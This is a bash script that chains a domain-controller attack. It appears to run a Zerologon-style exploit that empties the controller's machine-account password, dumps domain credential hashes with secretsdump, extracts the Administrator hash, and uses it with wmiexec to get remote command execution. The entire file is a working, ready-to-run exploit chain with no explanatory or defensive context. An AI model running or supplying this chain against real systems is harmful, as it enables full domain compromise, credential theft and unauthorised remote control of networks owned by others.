#! /bin/bash

python3 set_empty_pw.py $2 $3
hashes=$(secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 "$1/$2"'$@'"$3" \
         | sed -nr 's/Administrator:[0-9]+:(.*:.*):::/\1/p')
wmiexec.py -hashes $hashes "$1/Administrator@$3"

